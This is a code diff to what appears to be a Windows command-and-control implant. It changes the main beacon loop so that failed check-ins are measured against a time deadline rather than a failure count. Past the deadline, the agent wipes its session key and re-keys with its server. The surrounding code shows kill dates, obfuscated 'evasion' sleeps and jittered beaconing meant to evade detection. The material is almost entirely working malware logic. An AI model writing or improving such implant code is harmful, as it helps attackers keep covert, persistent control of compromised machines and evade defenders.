@@ -703,7 +703,15 @@ BOOL agent_checkin(AgentState *state) {
 /* ─── Main loop ─── */
 
 void agent_run(AgentState *state) {
-    int consecutive_checkin_failures = 0;
+    DWORD last_good_checkin = GetTickCount();
+
+    /*
+     * Re-key deadline: if no successful check-in within this window,
+     * assume the server lost our session (restart) and re-key.
+     * Window = sleep + max_jitter + 1 second grace.
+     */
+    DWORD max_jitter_ms = (DWORD)(state->sleep_ms * state->jitter_pct / 100);
+    DWORD rekey_deadline_ms = (DWORD)state->sleep_ms + max_jitter_ms + 1000;
 
     while (state->running) {
         /* Kill date check */
@@ -735,40 +743,38 @@ void agent_run(AgentState *state) {
             if (!state->running) break;
             if (state->has_session_key) {
                 DBG("[run] key exchange succeeded — resuming check-ins");
-                consecutive_checkin_failures = 0;
+                last_good_checkin = GetTickCount();
             }
             continue;
         }
 
-        /* Check in (with channel fallback on failure) */
+        /* Check in */
         if (!agent_checkin(state)) {
-            consecutive_checkin_failures++;
-            DBG("[run] checkin FAILED (%d consecutive)", consecutive_checkin_failures);
+            DWORD elapsed = GetTickCount() - last_good_checkin;
+            DBG("[run] checkin FAILED (elapsed %u ms, deadline %u ms)",
+                elapsed, rekey_deadline_ms);
 
-            if (consecutive_checkin_failures < CONFIG_CHANNEL_MAX_FAILURES) {
-                /* Retry with increasing backoff: 2x, 4x, 8x, 16x normal sleep */
-                int backoff_ms = state->sleep_ms * (1 << consecutive_checkin_failures);
-                if (backoff_ms > 300000) backoff_ms = 300000; /* Cap at 5 minutes */
-                DBG("[run] retry backoff %d ms", backoff_ms);
-                evasion_sleep_obfuscated((DWORD)backoff_ms);
-                continue;  /* Retry immediately (skip normal sleep) */
+            if (elapsed > rekey_deadline_ms) {
+                /*
+                 * Missed the beacon window — server likely restarted.
+                 * Invalidate session and re-key immediately.
+                 */
+                DBG("[run] exceeded rekey deadline (%u > %u) — invalidating session",
+                    elapsed, rekey_deadline_ms);
+                SecureZeroMemory(state->session_key, KEY_SIZE);
+                state->has_session_key = FALSE;
+                state->nonce_counter = 0;
+                state->msg_id = 0;
+                continue;  /* Will re-key on next iteration */
             }
 
-            /*
-             * Exhausted check-in retries — server likely restarted and lost
-             * our session key.  Invalidate the session and re-key on next
-             * iteration instead of sleeping for an hour.
-             */
-            DBG("[run] %d consecutive failures — invalidating session, will re-key",
-                consecutive_checkin_failures);
-            SecureZeroMemory(state->session_key, KEY_SIZE);
-            state->has_session_key = FALSE;
-            state->nonce_counter = 0;
-            consecutive_checkin_failures = 0;
+            /* Still within the window — short retry delay */
+            evasion_sleep_obfuscated(1000);
             continue;
-        } else {
-            consecutive_checkin_failures = 0;
         }
+
+        /* Check-in succeeded */
+        last_good_checkin = GetTickCount();
 
         /* Exit immediately if checkin received EXIT task */
         if (!state->running) break;
@@ -776,8 +782,8 @@ void agent_run(AgentState *state) {
         /* Sleep with jitter */
         int jitter = 0;
         if (state->jitter_pct > 0 && state->sleep_ms > 0) {
-            int max_jitter = state->sleep_ms * state->jitter_pct / 100;
-            jitter = (rand() % (2 * max_jitter + 1)) - max_jitter;
+            int mj = state->sleep_ms * state->jitter_pct / 100;
+            jitter = (rand() % (2 * mj + 1)) - mj;
         }
         int sleep_time = state->sleep_ms + jitter;
         if (sleep_time < 1000) sleep_time = 1000;
